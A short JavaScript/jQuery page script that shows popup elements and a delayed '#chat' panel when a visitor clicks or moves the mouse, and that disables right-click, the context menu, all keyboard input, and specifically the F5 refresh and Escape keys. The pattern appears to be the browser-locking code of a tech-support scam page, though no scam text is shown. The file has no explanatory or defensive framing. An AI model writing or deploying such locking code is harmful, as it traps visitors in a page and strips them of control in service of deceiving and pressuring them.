$(document).ready(function () {
    $("#mycanvas").click(function () {
        $("#welcomeDiv").show();
    });
    $("#mycanvas").click(function () {
        $("#poptxt").show();
    });
    $("#mycanvas").click(function () {
        $("#footer").show();
    });
    $("body").mouseover(function () {
        $("#poptxt").show();
    });
});

var isNS = "Netscape" == navigator.appName ? 1 : 0;

if ("Netscape" == navigator.appName && document.captureEvents) {
    document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
}

function mischandler() {
    return false;
}

function mousehandler(event) {
    var button = isNS ? event.which : event.button;
    if (button == 2 || button == 3) {
        return false;
    }
}

document.oncontextmenu = mischandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;

document.onkeydown = function () {
    return false;
};

document.addEventListener("keydown", function (event) {
    if (event.keyCode === 116 || event.keyCode === 27) {
        event.returnValue = false;
        event.keyCode = 0;
        event.preventDefault();
    }
}, false);

$(document).ready(function () {
    $("#chat").delay(600).fadeIn(100);
});
